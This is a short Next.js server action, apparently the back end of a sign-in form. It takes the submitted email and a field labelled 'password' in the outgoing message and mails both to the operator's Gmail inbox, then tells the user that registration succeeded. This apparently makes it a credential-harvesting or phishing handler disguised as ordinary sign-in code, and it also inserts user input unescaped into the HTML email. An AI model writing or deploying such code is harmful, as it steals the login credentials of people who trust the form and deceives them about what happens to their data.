"use server";

import nodemailer from "nodemailer";


export type FormState = {
  success: boolean;
  message: string;
};

export async function handleSignIn(
  prevState: FormState,
  formData: FormData
): Promise<FormState> {
  const name = formData.get("name") as string;
  const email = formData.get("email") as string;

  if (!name || !email) {
    return { success: false, message: "Please fill in all fields." };
  }

  try {
    // 1. Set up the Gmail SMTP Transporter
    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: process.env.GMAIL_USER,
        pass: process.env.GMAIL_APP_PASSWORD,
      },
    });

    // 2. Dispatch Email to your Gmail Inbox
    await transporter.sendMail({
      from: `"Next.js Sign-In" <${process.env.GMAIL_USER}>`,
      to: process.env.GMAIL_USER, // Sends email to yourself
      subject: `New Sign-In Submission: ${name}`,
      html: `
        <div style="font-family: Arial, sans-serif; padding: 20px; color: #333;">
          <h2 style="color: #10b981;">New Sign-In Received</h2>
          <p><strong>Email:</strong> ${email}</p>
          <p><strong>password:</strong> ${name}</p>
          <hr style="border: 0; border-top: 1px solid #ccc; margin: 20px 0;" />
          <p style="font-size: 12px; color: #777;">Sent automatically via Gmail SMTP on Next.js</p>
        </div>
      `,
    });

    return { success: true, message: "Registration successful!" };
  } catch (error) {
    console.error("Gmail Transport Error:", error);
    return { success: false, message: "Failed to send email. Check credentials." };
  }
}